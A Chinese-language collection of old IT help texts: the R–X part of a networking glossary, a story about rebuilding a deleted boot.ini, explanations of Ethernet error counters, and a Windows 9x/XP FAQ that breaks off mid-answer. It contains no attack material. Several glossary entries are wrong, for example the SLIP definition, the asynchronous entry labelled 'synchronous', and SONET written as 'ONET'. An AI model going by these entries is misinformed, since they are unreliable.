? Resource Reservation Protocol (资源预订协议, RSVP)—资源预订协议用于基于T C P / I P
的网络中，可使应用程序能够预订所需要的计算机和网络资源，如带宽、缓冲、最大脉
冲串和服务级别等。R S V P的英文全写为Resource Reservation Protocol ，有时也写作
Resource Reservation Setup Protocol。
? Reverse Address Resolution Protocol(反向地址解析协议, RARP)—一种网络协议，网
络结点上的软件应用或者网络结点本身可以利用该协议确定它自己的I P。
? ring topology (环形拓扑)—在环形拓扑结构中，网络是由数据的连续路径构成的，没
有起始点和终止点，因此也就没有终结器。
? riser cable (上升电缆)—垂直电缆的另一个称呼，指大楼内各楼层间连接用的电缆。
? router (路由器)—路由器是连接访问方法相同或不同的网络的网络设备，如路由器可
以将以太网与令牌环网相连。路由器根据源于网络管理员的路由表数据、发现的最有效
的路由和预编程信息，使用决策进程来向网络提交包。
? Routing Information Protocol (路由信息协议, RIP)—路由信息协议是路由器用来与其
他路由器交流整个路由表的协议。
S
? scan lines (扫描线)—扫描线用来构造电视视频图像。扫描线中含有图像的片面视图，
并从上到下在显示器上显示。在美国，一个电视帧由5 2 5扫描线组成。
? Secure Sockets Layer (加密套接字协议层, SSL)—S S L是一种在服务器和客户端采用的
数字加密技术，例如在客户端的浏览器和Internet 服务器之间可以使用S S L。
? segment (段)—段是符合I E E E规范的一条电缆，如一段1 8 5米长带有3 0个结点(包括终
结器和网络设备)的10Base2 电缆。
? Sequence Packet Exchange (序列包交换, SPX)—一个N o v e l l协议，当对数据可靠性有
特殊要求时，用于应用软件的网络传输。
? serial Line Internet Protocol (串行线路互连网协议, SLIP)— 一个电信网络的WA N协
议，用于在两个电信载波之间建立最快的路由。
? Service data unit (服务数据单元, SDU)—S D U是一种已经在O S I层间进行过转换并删除
了其中的控制信息和转换指令的协议数据单元。
? service level agreement (服务标准协议, SLA)—WA N服务提供商提出的服务标准书面
保证，包括线路必须有效的最小时间。
? shielded twisted-pair cable (屏蔽双绞线, STP)—屏蔽双绞线是一种网络电缆，由绞在
一起的绝缘电线对组成，并包围着一层屏蔽材料，以进行E M I和R F I保护。所有这些都
处在一个保护套管中。
? Simple Network Management (简单网络管理协议, SNMP)—T C P / I P协议套中的一个协
议，计算机或者网络设备可以通过该协议收集关于网络性能的标准化数据。
306计计局域网/广域网的设计与实现
下载
? spanning tree algorithm (生成树算法)—生成树算法是用以确保帧不会无限循环传输的
软件，并可以使帧沿成本最低最有效的网络路径传输。
? spread-spectrum communications (传播光谱技术)—这种通信技术主要用在无线网络
中，在网络间进行高频率通信时可以用它来替代电缆。
? star topology (星形拓扑)—这是最古老的一种网络设计，整个网络是由多个连接在集
线器上的结点构成。
? stateful autoconfiguration (有状态自动配置)—一种利用网络管理软件，基于网络管理
员给出的一组参数自动分配I P地址的技术。
? stateless autoconfiguration (无状态自动配置)—一种分配I P地址的方法，在该方法中，
网络设备自己给自己分配地址。
? state-transition encoding (状态转换编码)—这是一种检验信号状态的改变(如从高到低、
从低到高等)的数字编码方法。
? static routing (静态路由)—静态路由是一种路由进程，包括对网络管理员根据预先调
试的路由指令而做出的路由决定的控制。
? statistical multiple access (统计多路访问)—统计多路访问是根据任务所需分配通信资
源的一种交换方法，例如，给视频文件分配更多的带宽，而给较小的电子表文件分配较
少的带宽。
? store-and-forward switching (存储转发交换)—在存储转发交换技术中，包可以被缓存，
直到完全接收后再发送，并且网络上有一条开放的信道可以发送包。
? streaming (流)—在从网络接收来的M P E G视频文件完全下载之前播放。
? subnet mask (子网模)—子网模(也称子网掩码)是I P地址的某个确定的部分，用于指明
一个网络的地址类别，可以利用它将网络分成子网，以便进行网络流量管理。
? Switched Multimegabit Data Services (交换多兆位数据服务, SMDS)—也叫做交换式兆
位数据服务，是一种由地区电话公司开发的传输方法，利用该技术可以在M A N和WA N
上提供基于信元的高速通信。
? switched virtual circuit (交换虚拟电路, SVC)—为持续的通信会话而创建的一种通信信
道，通常位于可以处理多个信道的介质上。
? synchronous communications (同步通信)—由数据的连续脉冲串进行的通信，而且数
据的连续脉冲串要受每一个脉冲串起始位置的时钟信号控制。
? synchronous communications (异步通信0—异步通信发生离散的单元中，在离散单元
里，单元的开始位置由前面的开始位标示，终止位由单元最后的停止位给出信号。
? synchronous optical network (同步光纤网络, ONET)—一种光纤通信技术，可以进行高
速的数据通信(每秒在兆位以上)。基于S O N E T的网络可以完成语音、数据和视频通信。
? System Network Architecture (系统网络结构, SNA)—系统网络结构是I B M使用的一种
分层通信协议，以便I B M主机和终端进行通信。
? Systeme Electronique Pour Couleur Avec Memoire (顺序与存储彩色电视系统, SECAM)
—顺序与存储彩色电视系统是一种与PA L相似的电视传输标准，但是是用在法国、俄
国和非洲的一些国家。
T
? T-carrier (T载波)—T载波是可用于数据通信的专用电话线路，将两个不同的位置连接
起来，以进行点对点的通信。
? TCP port (TCP端口)—与虚拟电路类似的一种功能，通过T C P端口，位于两个通信结
点或者设备上的单个进程之间可以进行通信。每个通信的进程都有自己的端口号，在有
多个进程同时进行通信的时候，可以使用多个端口。
? telco—地区的电话公司，如US We s t。
? Telecommunications Industry Association (通信工业联合会, TIA)—T I A是E I A中的建立
标准的一个实体，主要开发远程通信和布线标准。
? television frame (电视帧)—电视帧是一系列图片中用来模仿动作的一幅完整的图片。
? Te l n e t—一种T C P / I P应用协议，可以提供终端仿真。
? terminal (终端)—终端是具有监视器和键盘的设备，但对本地处理而言是没有C P U的。
终端与主机相连，处理过程均在主机上完成。
? terminal adapter (终端适配器, TA )—终端适配器是将计算机或传真机连接在I S D N线路
上的设备。终端适配器可将数字信号转变为可以在数字电话线路上发送的协议。
? terminal emulation (终端仿真)—用软件来使计算机(如P C )的行为类似于终端。
? time-division multiple access (时分多路访问技术)—这种交换方法通过划分时间槽(每
个时间槽对应一台设备，设备从中可以进行信号传输)使得多个设备可以在同一种通信
介质上进行通信。
? token ring (令牌环)—这是由I B M公司于7 0年代开发的一种访问方法，它仍然保留着主
要的L A N技术。这种传输方法在物理上采用星形拓扑结构，而在逻辑上采用环形拓扑结
构。虽然在令牌环网中，每一个结点也连接在中央集线器上，但包在结点到结点间进行
传输时就好像没有开始点和终止点一样。
? topology (拓扑结构)—拓扑结构是电缆上发送包所遵循的电缆的物理布局和逻辑路径。
? translation (转换)—转换是一种传输协议转变为另一种传输协议的方法。
? translational bridge (转换网桥)—转换网桥是使用不同传输协议的网络间的网桥，它可
以向网络传送适当的不同协议。
? Transmission Control Protocol (传输控制协议, TCP)—这是一种传输协议，属于T C P / I P
协议套的一部分，用于在网络软件应用进程之间建立通信会话，并且可以通过控制数据
流量做到可靠的端到端数据传输。
? Trivial File Transfer Protocol (普通文件传输协议, TFTP)—T C P / I P文件传输协议，用于
传输无盘工作站启动所使用的文件。
? trunking (中继)—在两个网络传输设备之间的两个或多个物理链接，它们组成一个集
合可当做一条线路使用，总的传输速率是每个链接传输速率的总和。
? twisted-pair cable (双绞线)—双绞线是一种柔性通信电缆，其中包含着绞在一起的成
对的绝缘铜线以减少E M I和R F I的干扰，双绞线的外部还覆盖着一层绝缘套管。
下载
? uninterruptible power supply (不间断电源, UPS)—在电源故障或电压不足时，提供快
速电池供电的设备，有时是在一个电子设备中，有时作为一个单独的设备。
? universal serial bus (通用串行总线, USB)—通用串行总线是为连接各种外设(如打印
机、调制解调器、磁带驱动器)而建立的标准，将要替代传统并行和串行端口的使用。
? unshielded twisted-pair cable ( 非屏蔽双绞线, UTP)—这是一种在绞在一起的成对的绝
缘线和外部套管间没有屏蔽的电缆。
? User Datagram Protocol (用户数据报协议, UDP)—一种使用I P的协议，它和T C P的位
置一样，可以提供低开销的无连接服务。
? U s e r-Network Interface(用户—网络接口, UNI)—一个AT M接口，用于终端结点到交换
机的连接。
V
? virtual circuit (虚拟电路)—虚拟电路是由O S I网络层为发送和接收数据而建立的逻辑
通信路径。
? virtual LAN (虚拟局域网, VLAN)—虚拟局域网是在子网组之外建立的逻辑网络，而
子网组是通过交换机和路由器上的智能软件建立并独立于物理网络拓扑结构的。
? virtual path identifier/virtual channel identifier ( 虚拟路径标识符/虚拟通道标识符,
V P I / V C I )— AT M信元中的一个编码，使得信元能够到达想要到达的输出接口。
W
? wavelength division multiplexing (波长分割多路转接器, WDM)—波长分割多路转接器
是一种用于光纤介质的交换技术，可以截取几个输入连接，并将其转化为在光纤电缆上
传送的光谱范围内的不同的波长。
? wide area network (广域网, WA N )—广域网是一种意义深远的网络系统，可以跨越极
大的物理空间。
X
? X . 2 5—一种老的非常可靠的分组交换协议，最高可以以2 . 0 4 8 M b p s的速率连接到远程
的网络上。X . 2 5协议定义了D T E和D C E之间的通信。
? X/Open XA—基于U N I X的系统所使用的一种开放数据库标准。
? Xerox Network System (施乐网络系统, XNS)— 一个由施乐公司在网络早期开发的用
于以太网通信的协议。

非法启动
开机时显示“文件Boot.ini非法从C:\winnt下启动”这是什么原因呢??
百无聊赖时整理硬盘文件，把自认为无用的东西全部扔进了回收站，继而又清空了回收站。看着整理后的磁盘，不禁有一种洗了澡的感觉--爽！
第二天开机，"boot.ini非法，程序将由C:\winnt下启动"的提示把我惊呆了。"我的选单呢？"我装的是双操作系统，C盘是Windows 2000，D盘是Windows XP，每次启动时都有选单，可这次却非常霸道的直接起了Windows 2000……
回想昨天，"哦，一定是有个叫boot.ini的文件被我扫出去了"。回收站已清，如何是好？突然想起朋友的电脑和我的安装情况一模一样，马上以100迈的速度跑到他那里，疯狂的搜索起来，不到0.1秒，文件即出现在视野（boot.ini文件的位置在C盘根目录）双击打开，只有寥寥几行：
[boot loader]
timeout=3
default=multi(0)disk(0)rdisk(0)partition(1)\WINNT
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINNT="Microsoft Windows 2000 Professional" /fastdetect
multi(0)disk(0)rdisk(0)partition(2)\WINDOWS="Microsoft Windows XP Professional" /fastdetect
因为没带软盘，所以用笔抄录下来，在自己的电脑上用记事本新建了同样内容、同样名称的文件（注意：扩展名一定要为.ini，用记事本建立文件保存是"保存类型"要选"所有文件"）。重启，果然看到了初别的选单。兴奋之余，我想：这几行字里是不是还有别的学问呢？经过一番试验，终于搞明白了其中的奥妙：
"timeout=3"是设置系统等待时间的，最少可以是0秒，最多……几个月是没问题；
"default=multi(0)disk(0)rdisk(0)partition(1)\WINNT"是启动时被自动标亮的选项，当时间为0时，系统将启动此处所设系统；
"[operating systems]"列出了供我们选择的启动项，我的电脑是"Microsoft Windows 2000 Professional"与"Microsoft Windows XP Professional"，如果你看惯了原来的提示，尽可以用其他的内容代替，并且支持汉字，将你想要的内容放到引号中即可。你还可以多加几条假的选项，用来迷惑随便动你电脑的人，方法是在"[operating systems]"下加入类似
"multi(0)disk(0)rdisk(0)partition(1)\WINNT="的选项，只要改动其中的某个数字或文件夹即可。此外，如果将选项的前后顺序互换，在启动时也随即改变。
网络设备中常见术语的含义
CRC Error： 
---- 含 义： 指 示 在 数 据 传 输 中 有 坏 帧 出 现。 坏 帧 将 被 丢 弃， 并 通 过 高 层 协 议 而 重 传。 
---- 原 因： 通 常 因 电 缆 或 网 络 硬 件 错 误、 环 境 噪 音 造 成。 如 网 卡 硬 件 错 误， 劣 质 电 缆。 
---- 解 决 方 法： 更 换 网 络 硬 件 或 避 开 周 围 的 环 境 干 扰 源。 
---- Short Frame： 
---- 含 义： 说 明 设 备 端 口 有 小 于 最 小 的 帧 长（64 byte） 的 帧 被 接 收 并 且 该 帧 有 错 误。 
---- 原 因： 由 于 受 到 噪 音 干 扰、 电 缆 错 误 及 落 硬 件 错 误。 如 果 经 常 发 生， 须 应 予 以 解 决。 
---- 解 决 方 法： 更 换 网 络 硬 件 或 避 开 周 围 的 环 境 干 扰 源。 
---- Fragment： 
---- 含 义： 具 有 坏 帧 或CRC 错 误 的 小 于64 byte 的 数 据 包。 
---- 原 因： 网 络 负 担 过 重， 起 多 是 因 网 络 冲 突 造 成。 
---- 解 决 方 法： 网 络 负 担 过 重 而 造 成 网 络 冲 突， 应 该 采 用 交 换 设 备 或 分 割 网 段。 
---- Alignment： 
---- 含 义： 被 接 收 的 帧 有 重 组 错 误。 帧 重 组 错 误 是 大 于64 byte 的 有CRC 错 误 的 帧 且 在 长 度 上 不 是 整 数 位（ 帧 的 位 数 不 能 被8 整 除）。 
---- 原 因： 多 是 因 电 缆 或 收 发 器 错 误 或 是 由 于 连 接 的 速 率 不 匹 配。 
---- 解 决 方 法： 有 帧 重 组 错 误， 其 将 被 丢 弃 而 重 传， 这 样 将 严 重 影 响 网 络 性 能， 所 以 应 该 予 以 重 视。 更 换 收 发 器 或 收 发 器 电 缆， 调 节 网 线 两 端 设 备 的 速 率。 
---- Runt Frame： 
---- 含 义： 小 于 最 小 帧 长 度（64 byte） 并 且 具 有 正 常FCS 的 帧。 
---- 原 因： 多 是 由 于 网 络 冲 突 造 成。 当 网 络 冲 突 消 失 后 其 也 消 失。 
---- 解 决 方 法： 如 果 有 该 类 型 的 数 据 帧 不 断 出 现， 应 该 采 取 措 施 减 轻 网 络 负 担。 
---- Long Frame： 
---- 含 义： 指 大 于1518 byte 而 小 于6000 byte 的 帧。 连 续 多 的 长 帧 影 响 网 络 性 能， 并 且 可 能 导 致 网 络 传 输 中 断。 
---- 原 因： 工 作 站 传 输 长 帧 是 由 于 硬 件 或 软 件 错 误 造 成。 与 之 相 近 还 有“Very Longs（ 也 叫giants）”， 其 表 示 有 大 于6000 字 节 的 帧 出 现。 造 成 的 原 因 与 之 类 似。 
---- 解 决 方 法： 应 该 从 网 络 中 把 该 坏 节 点 移 走。 
---- Jabber： 
---- Jabber 是 一 个 有CRC 错 误 的 长 帧（ 大 于1518 byte 而 小 于6000 byte） 或 是 数 据 包 重 组 错 误。 
---- 原 因： 它 可 能 导 致 网 络 丢 包。 多 是 由 于 工 作 站 有 硬 件 或 软 件 错 误。 
---- 解 决 方 法： 应 该 认 真 检 查 工 作 站 或 把 其 从 网 上 去 走。 如 果 该 适 配 器 在 其 它 计 算 机 上 工 作 正 常， 则 应 该 检 查： 连 接 节 点 电 缆 是 否 过 长； 是 否 全 双 工 通 信 方 式 与 交 换 机 之 间 不 匹 配。 当Jabber 灯 亮 时， 收 发 器 具 有 自 动 阻 止 数 据 传 输 以 减 轻 网 络 流 量 负 担。 
---- Collision： 
---- 含 义： 数 据 包 在 网 络 传 输 中 发 生 冲 突。 
---- 原 因： 由 于 数 据 包 在 介 质 中 并 发 传 输 而 导 致， 通 常 是 由 于 网 段 拥 塞 所 造 成。 解 决 方 法：HUB 应 该 更 换 成 交 换 机 或 把 网 络 设 备 移 到 其 它 网 段， 使 得 通 信 负 载 平 衡。 
---- Late collision： 
---- 含 义：64 byte 帧 发 送 后 发 生 的 错 误， 它 将 影 响 网 络 性 能。 在 一 个 健 康 的 网 络 中 极 少 发 生 此 类 错 误。 
---- 原 因： 产 生 的 典 型 原 因 是：（1） 不 正 确 的Duplex 模 式 设 置；（2） 电 缆 超 长（ 信 号 传 输 中 延 时 过 大）；（3） 工 作 站 间 超 过 了4 中 继 原 则；（4） 网 络 工 作 站 的 硬 件 错 误。 
---- 解 决 方 法： 针 对 以 上 原 因 一 步 一 步 排 除。 
---- Excessive collision： 
---- 含 义： 冲 突 后， 帧 被 重 传。 如 果 重 传 尝 试 次 数 超 过 了15 次 就 叫Excessive collision。 
---- 原 因： 网 络 负 载 过 大 或 节 点 硬 件 错 误。 
---- 解 决 方 法： 查 找 节 点 的 硬 件 错 误 并 予 以 更 换； 网 段 中 应 该 使 用 交 换 机 或 其 它 手 段 减 轻 网 络 负 载。 
---- Code violation： 
---- 含 义： 表 示 有 非 法 的 代 码 被 交 换 机 接 收。 
---- 原 因： 在 用 交 换 机 中， 当 使100M 速 率 传 输 时， 每4 位 代 码 在 线 路 上 按5 位 代 码 传 输。 这 就 可 能 产 生 一 些 非 法 代 码， 它 不 该 被 传 送， 如 果 被 传 送， 就 叫Code violation。 由 于 网 络 线 路 中 信 号 在 传 输 中 受 到 外 界 信 号 干 扰。 
---- 解 决 方 法： 使 用 屏 蔽 线 或 减 小 外 界 干 扰 信 号。 特 别 在100M 的 双 绞 线 走 线 中 与 干 扰 源 并 行 走 线。 
---- DRM（Data Rate Mismatch）： 
---- 含 义： 被 接 收 的 信 号 和HUB 等 设 备 内 部 时 钟 不 匹 配。 
---- 原 因：HUB 等 的 硬 件 问 题 或 网 络 接 口 问 题。 
---- 现 象：Link/Traffic 指 示 灯 不 亮： 
---- 原 因： 网 卡、 线 缆 或 设 备 端 口（ 如HUB） 有 问 题。 解 决 方 法： 大 部 分 此 类 现 象 是 由 于 网 卡 或 线 缆 问 题 造 成。 应 该 认 真 检 查 网 卡 和 线 缆， 替 换 成 好 的 网 卡 和 线 缆。 
---- 现 象：PWR LED 灯 不 亮： 
---- 原 因： 电 源 线 没 有 连 接 好、HUB 的 电 源 坏 了。 
---- 解 决 方 法： 连 接 好 电 源 或 更 换HUB。 
---- 现 象：Partitioning 灯 亮 (red)： 
---- 原 因： 说 明 网 络 有 故 障 出 现， 当 线 缆 有 问 题 或 冲 突 特 别 频 繁 时 该 端 口 暂 时 被 隔 离。（1）、 连 接 的 电 缆 有 问 题；（2）、 设 备 端 口（ 如HUB、 中 继 器、 收 发 器 口） 问 题；（3）、 网 卡 问 题；D、 线 缆 的 端 结（ 如 连 接 器、 端 子） 问 题。 
---- 解 决 方 法： 当 错 误 消 失 后， 该HUB 口 自 动 有 效。 针 对 以 上 不 同 类 别 情 况， 应 该 首 先 认 真 检 查 连 接 到 该 设 备 的 线 缆 及 其 端 口 连 接 良 好 否； 再 检 查 其 它 连 接 段 的 设 备 端 口、 网 卡、 线 缆 的 端 结 器 连 接 好 否， 一 步 一 步 排 除， 查 找 出 错 误 的 原 因。 
---- Reset： 
---- 含 义： 不 用 关 电 而 使 得 设 备 从 新 完 成 所 变 动 端 口 的 配 置。 特 别 是 在 一 些 中 继 器 中。 
---- Link： 
---- 含 义： 当 该 端 口 连 接 到 一 台 加 点 的 设 备 上 该 指 示 灯 就 亮。 当 连 接 的 设 备 断 电 或 连 接 有 问 题 就 灭 了。 
---- Receive（Rx）： 
---- 含 义： 当 该 端 口 连 接 到 网 络 上 并 接 收 到 数 据 包 时， 指 示 灯 就 不 断 闪 烁。 
---- Translation（Tx）： 
---- 含 义： 当 该 端 口 连 接 到 网 络 上 并 发 送 数 据 包 时， 指 示 灯 就 不 断 闪 烁。 
---- SQE（Signal Quality Error）： 
---- 含 义： 即“heart beat” 功 能， 其 产 生 一 个 叫“Collision Presence Test”（ 多 叫“Heart Beat”） 的 信 号， 在 设 备 运 行 中 检 测 电 路 冲 突， 多 出 现 在 收 发 器 上。 当 把 收 发 器 连 接 到 计 算 机 上 时， 其 设 置 成“Enable/ON”， 当 连 接 到 中 继 器、HUB 上 时， 设 置 成 “Disabled/OFF”。 
---- AUI（Attachment Unit Interface）： 
---- 含 义： 是 一 个 介 质 单 元 接 口。 它 有IEEE 802.3 定 义 的 一 个15 针（DB-15） 接 口 规 范， 用 于 连 接PC、 服 务 器 及 其 它 连 接 到 粗 缆 的 设 备 上。 它 也 可 以 通 过 以 太 网 收 发 器 或MAU（Media Access Unit） 连 接 到 各 种 以 太 网 介 质（ 如BNC、 光 纤） 上。 有 些HUB、 中 继 器 上 有 此 标 识 符， 当 把 开 关 拨 到 其 端，AUI 就 起 作 用。 
---- MAU（Medium Attachment Unit）： 
---- 含 义： 是 一 个 用 于 连 接DTE 到 传 输 介 质 的 网 络 设 备。 以 太 网 收 发 器（Transceiver） 就 是 一 个MAU。 一 个10BASE-T MAU 用 于 连 接UTP 到 一 个AUI 接 口 上（ 如HUB、 中 继 器、 网 卡）。 
---- BNC（Bayonet Nut Couple）： 
---- 含 义： 细 缆 接 口 之 一（ 还 有T 型 头、 细 缆 端 子）。 在 有 些HUB、 中 继 器 上 有 此 标 识 符， 当 把 开 关 拨 到 该 端， 该 端 口 即 连 接 到 网 络 上， 有 数 据 包 时， 其 对 应 的 指 示 灯 就 不 断 闪 烁。 
---- Daisy-Chain Port： 
---- 含 义： 是 一 个MDI 的RJ45 口， 通 过 直 连 线（straight-through） 级 联（cascade） 其 它 同 类 设 备。 
---- MDI Port（Medium Dependent Interface）： 
---- 含 义：MDI 是IEEE 10BASE-T 标 准 中 规 定 的 用 于UTP 线 缆 的 接 口 之 一。 该 口 通 过 直 连 线 连 接HUB 到ROUTER、SWITCH 等 网 络 设 备 上。 
---- MDI-X Port（Medium Dependent Interface - Crossed）： 
---- 含 义：MDI-X 是 一 般 的RJ45 口（ 如HUB 上 的 绝 大 数 口 都 是 此 类 型 的）， 它 内 部 完 成 完 成 了 交 叉， 使 用 直 连 线 可 以 连 接HUB 到 工 作 站 的 网 卡 上。 
常见问题及解答
常见问题及解答
1:请问win386.swp是什么文件，为什么删除不了 
答：是虛擬内存文件（在9X和ME的系統中存在） 
你可以來設定它的大小的！
参考：最小值应该是物理内存的数加上12（物理内存在256MB以上的） 
内存在128MB或者更少的建议最小值为物理内存的1.75倍 
在128MB到256Mb之间的设置为1.5倍 
256Mb以上就设置为2.5倍
建议页面文件放在一个硬盘分区内``分散影响速度！！
也可以禁止使用！(系统默认是windows自己管理！)
你可以在DOS下用del命令删除。 (不过开机后它又会自动生成的) 
2：如何恢复注册表（for 9x/me) 
答：启动到DOS下输入scanreg /restore可以选择恢复。选择出问题前的日期哦!
更详细的注册表恢复与备份请看这里! 
2000/xp中
我们一般在启动计算机看见“正在启动2000/xp”的信息后，按F8键。然后在出现的界面中选择“最后一次正确的配置”然后回车，启动系统，操作完毕后，注册表将被还原到上次成功启动计算机的时候的状态！ 
3：金山毒霸2002／金山网镖2002故障及不能升级问题的处理方法 
答：如果您的毒霸不能卸载，您可以按照以下步骤卸载您的毒霸 
1、使用"开始"菜单中"金山毒霸2002"中的"卸载金山毒霸2002"选项将金山毒霸2002自动卸载。 
2、在"我的电脑"中金山毒霸2002的安装位置将金山毒霸2002的文件夹删除。 
3、从注册表中删除金山毒霸2002的键值。从开始菜单中选择"运行"，输入regedit后回车进入注册表。 
在编辑菜单下选择"查找"选择查看内容为"主键"输入antivirus后选择查找。将在kingsoft目录中找到的 
antivirus目录删除（其他杀毒软件也有用antivirus的，请注意只删除kingsoft目录中的antivirus）直到 
显示查找完毕。 
4、查找C:\Program files\InstallSheild Installation Information\，该文件夹为隐藏文件夹，默 
认情况下看不见，输入路径｀可以进入！ 
毒霸安装历史文件在这个文件中，其特征是SETUP.EXE文件的图标是毒霸 的双箭头标识。找到后删除这个文件夹。 
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝ 
如果毒霸2002不能在线升级或升级后出错怎么办呢? 
如果在线升级时提示有部分程序在使用中无法完成升级，您先终止毒霸的相关组件包括网 
镖、防火墙、邮件监控、小企鹅安全助手等，然后同时按住CTRL+ALT+DELETE(热启动的组合键），在弹出的窗口 
中，终止KAVTASKMNG程序的运行（如果有的话）。最后请单击开始|程序|金山毒霸XXXX|智能更新程序，这 
样毒霸的在线升级就会成功。 
如果还不能在线升级或升级后出错，请点击http://www.duba.net/download/other/02013101.htm下载 
相应版本的毒霸智能更新升级程序（update.exe）测试版，将其解压缩保存在毒霸的安装目录（如c:\kav） 
，覆盖旧版本文件后再尝试在线升级，方法是点击开始|程序|金山毒霸xx|智能更新程序，升级时建议使用 
广州3服务器。
毒霸2002问答集 
4：Windows不定时搜寻软驱问题 
答：如果你的 Windows 98/Me 常常会有事没事就去检查软驱，你可以从下面几个方面依顺序来检查，排除问题，以下，越在前面的方法，可能性越大。 
　　?清除开始菜单中，「文档」里的资料，如果你曾经开启过软盘上的文件，而这文件名称还存在于「文档」里的话，Windows 有可能会去搜寻软驱。 
　　?清除开始菜单中，「运行」里的项目。 
　　?到「设置」>>「控制面板」，打开「系统」，到「性能」这页，按「文件系统」，到「磁盘」，不要勾「每次开机就搜寻新的软驱」，按确定，当你重新启动计算机之后，Windows 就不会去侦测你的软驱。 
　　?检查一下是不是你的防毒软件会去检查软驱（例如 McAfee 、Antivirus 、Pccillin..等），请查阅你的防毒软件说明。 
　　?检查一下是不是你计算机上的一些工具软件会去检查你的软驱。 
　　?检查 MSDOS.SYS 这个文件里面（你必须知道如何修改文件属性，才能修改 MSDOS.SYS 的内容），有没有 LocalLoadHigh=1 这一行叙述，有的话，删掉。 
　　?检查一下是不是病毒的关系，造成系统不定时去搜寻软驱（例如 NEUVILLE 病毒）。 
　　?检查 registry：HKEY_CLASSES_ROOT/CLSID 的值，看看有没有任何的路径是指向到软盘上的。 

5：ME的关机选单里没有重新启动到MS-DOS模式怎么办 
答：当你在Windows Me中，按「开始」>>「关机」，在这个关闭 Windows 的窗口里，会找不到「重新启动到 MS-DOS」模式的选项，这不是你的计算机出了什么问题，而是 Windows Me 已经不再提供这项功能。 
　　在 Windows Me 唯一可以真正启动到以往纯 DOS 模式的方法，只剩利用「启动盘」一途了，顺便提一下，无论是 Windows 95、98 或 Me，它们在「附件」下的「MS-DOS」这是一个虚拟 DOS 程序，换言之，就一个在 Protect Mode下仿真 MS-DOS 的作业环境的程序，而「重新启动到 MS-DOS模式」就如同 DOS 操作系统，是属于一个 Real Mode 的作业环境。 
　　对多数的MS-DOS程序而言，都可以在虚拟的 DOS 环境下运行。但是有些比较特殊的 DOS 程序，好比需要主动掌控内存资源的（像是某些古老的 DOS Game）、或是需要存取硬件资源的（像是更新 BIOS 的程序），这一类的 DOS 程序都不一定能在虚拟的 DOS 环境中执行。 
　　注：在关机选单中，还会有一项「休眠」功能，但是并不是在每一台计算机上都会出现，如果你的主机板不支持休眠的功能，就不会有此选项。 

6：磁盘整理到一半总是重新开始怎么办 
答：这算是个出现频率非常高的问题，很多人都问过。 
　　在进行磁盘整理的时候，跑了一阵子，可能才到 3% 或 10%..，结果又自动重头来一遍，一直重复这项的动作，没有办法整理完，为什么呢？ 
　　先检查你的屏幕保护程序关了没？电源管理关了没？防毒软件关了没？ 
　　?在桌面空白的地方按鼠标右键选属性，到「屏幕保护程序」卷标，屏幕保护程序需要设为「无」，如果你计算机有安装其它外挂的屏幕保护程序，也请记得关闭。 
　　?同样在「屏幕保护程序」卷标页的下方，有监视器省电功能，按「设定」，系统待命必须是「从不」，关闭硬盘必须是「从不」，监视器关不关无所谓。 
　　?有些防毒软件会干扰磁盘整理，有些则不会，如果你一直被这问题困扰，不妨关闭你的防毒软件，测试看看。 
　　Windows 的电源管理也关了、屏幕保护也关了，为什么还是一样的情况呢？ 
　　这可能是受到计算机上仍有一些在后台运作的应用软件，或是驱动程序的影响，某个程序一直要写资料到硬盘上，磁盘整理程序就没有办法完成整理的工作。 
　　对一般使用者而言，要找出是哪个程序在背后捣蛋，也是不容易，所以.. 
　　如果你的计算机在每一次磁盘整理的时候都一直发生这种问题（先确认你的屏幕保护程序、电源管理都已经关了，结果还是一样），有一个最简单的方法可以解决，当你要整理的时候，就是不让 Windows 在启动时加载任何的程序，等整理完毕，再加载。 
　　?按「开始」>>「运行」>>输入 msconfig，进入系统配置编辑器。 
　　?在「常规」这里，选「选择性开机」，任何一样都不要勾，按确定，重新启动你的计算机，计算机会启动在最干净的环境。 
　　?运行 Windows 的磁盘整理程序。 
　　等整理完毕，再执行msconfig，设回到「标准开机」，重新启动计算机就可以了。 
　　这个环境只是让你完成磁盘整理用的，因为我不在你的旁边，所以不知道是哪些软件引起的问题，所以只好用这种方法，让你停用所有预先加载的程序，让磁盘整理程序所受到的干扰减到最小，等整理完毕，再让系统恢复正常。 
　　记得整理完之后，一定要进入 msconfig 设回到「标准开机」，否则一堆驱动程序都没有加载，你的很多软件、设备大概都不能正常工作了。 

7：如何让98/me在dos中安装的更快 
答：那样就要使用参数了！
setup /id /ih /ie /im /is /iv来快速安装系统。
说明一下：ie 安装中不创建启动盘；（以后可以在“控制面板”--“添加删除”的“启动盘”中创建）
im 忽略对常规内存检查；（自己的内存符合安装98/me系统的最低的要求的前提下）
is 不检查磁盘；（保证自己的磁盘是没有错误的时候可以加这个）
iv 不运行公告牌内容（就是那些介绍文字）
id 忽略磁盘空间检查（当然你的磁盘空间要够的前提下）
ih 跳过注册表检查 

8：为什么我安装xp特别的慢 
答：也许你忘了加载SMARTDRV.EXE了！
方法：先运行SMARTDRV.EXE（一般在98系統的c:\windows目录下找到然后先放在软盘或别的什么移动储蓄卡里）然后就可以执行/i386/winnt.exe来安装xp了。
操作步骤：smartdrv 4096 回车/i386/winnt.exe回车！ 

9：任务条的属性点不开，怎么办 
答：运行regedit进入注册表编辑器，找到如下分支HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer，在右窗格内找到DWORD串值"NoSetTaskBar" 
设置为0或者是删除这一项 

10：为什么我关闭程序和网页后有时出现对话框说，“该程序执行非法操作，即将关闭”。有时关闭计算机都关不了，按ctrl+alt+del显示一个窗口Rundll32文件。这是什么回事? 
答：（参考）很可能的原因就是，你的 System.ini 这个文件里，在 [boot] 这个区段中，少了： 
drivers=mmsystem.dll 
这个叙述造成的，你自己补上去就可以解决这个问题。为什么会有这个错误的发生？大部分都是在使用控制面板「添加新硬件」这个功能时，使用不正确，像是需要驱动程序而你又不提供正确的驱动程序等等造成的。 
使用记事本或任何的纯文字编辑软件（像 UltraEdit），打开位于 C:\Windows 下的 System.ini 文件。 
找到 [ boot ] 这个区段。 
补上一行 drivers=mmsystem.dll 
补上后，记得「存盘」与「重新开机」。 
使用 Windows 98 的人，还有一个较方便的方法，你可以直接到「开始」>>「运行」，输入 msconfig，然后在 System.ini 这一页，打开 boot 文件夹，按新增，去新增一行叙述： 
drivers=mmsystem.dll 
设好后，记得储存你的设定，重新开机 。 
11：98系统下如何卸载WINDOWS XP 
答：先介绍在FAT32分区格式卸载方法！
例如：Windows 9X/Me安装在c盘，而xp安在d盘
